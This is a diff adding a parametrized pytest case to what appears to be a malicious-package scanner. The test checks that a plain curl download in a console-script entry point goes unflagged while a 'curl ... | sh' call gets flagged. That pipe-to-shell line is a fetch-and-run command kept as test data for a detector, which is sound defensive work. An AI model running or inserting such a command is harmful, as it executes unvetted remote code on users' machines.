@@ -1238,3 +1238,19 @@ def test_new_indirect_network_call_is_escalated_but_existing_one_is_not():
     assert vd.new_behaviors(new_with, old_with) == []
     [extra] = vd.new_behaviors(new_with, _findings("p-1.0", plain))
     assert extra.severity is Severity.HIGH and extra.location == "p-1.1/p/cost.py:3"
+
+
+@pytest.mark.parametrize(
+    ("cmd", "high"),
+    [
+        # ultralytics 8.3.40 — yolo 명령의 내려받기 재시도 (정상)
+        ("subprocess.run(['curl', '-#', '-L', url, '-o', f])", False),
+        ("subprocess.run('curl -fsSL http://x | sh', shell=True)", True),
+    ],
+)
+def test_entrypoint_downloader_alone_is_normal(cmd, high):
+    files = {"p-1/PKG-INFO": "Name: p",
+             "p-1/pyproject.toml": "[project.scripts]\np = 'p.cli:main'\n",
+             "p-1/p/__init__.py": "",
+             "p-1/p/cli.py": f"import subprocess\ndef main(url='u', f='o'):\n    {cmd}\n"}
+    assert (RULE_ENTRYPOINT in {f.rule for f in analyze_files(files)}) is high
